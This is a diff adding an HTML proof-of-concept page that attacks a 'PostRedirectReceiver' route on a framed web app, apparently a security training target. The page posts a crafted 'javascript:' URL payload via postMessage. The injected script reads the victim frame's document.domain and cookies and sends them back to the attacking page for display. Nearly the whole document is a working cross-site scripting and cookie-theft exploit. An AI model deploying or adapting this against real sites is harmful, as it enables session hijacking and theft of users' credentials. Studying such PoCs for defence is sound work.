@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+<iframe src="http://frontend.nodeseccode.net:8080/#/prototype/PostRedirectReceiver" id="tframe" sandbox="allow-scripts allow-same-origin allow-top-navigation allow-modals"></iframe>
+<div id="docDomain"></div>
+<div id="userCookies"></div>
+<script>
+window.addEventListener("message", function(msg) {
+  if (!msg.data) {
+    return;
+  }
+  document.getElementById("tframe").style = "display: none;";
+  if (msg.data.docDomain) {
+    let div = document.getElementById("docDomain");
+    div.innerHTML = "<h2>Document Domain</h2>"+msg.data.docDomain;
+  }
+  if (msg.data.userCookies) {
+    let div = document.getElementById("userCookies");
+    div.innerHTML = "<h2>User Cookies</h2>"+msg.data.userCookies;
+  }
+});
+
+const delay =4000;
+setTimeout(function() { poc(); }, delay);
+
+function poc() {
+  const payload = `
+    let msg = {
+      docDomain : document.domain,
+      userCookies : document.cookie,
+    };
+    window.parent.postMessage(msg, "*");
+  `
+  let msg = {
+    url : "javascript:"+payload,
+  };
+  let target = document.getElementById("tframe").contentWindow;
+  target.postMessage(msg, "*");
+}
+</script>
+</body>
+</html>
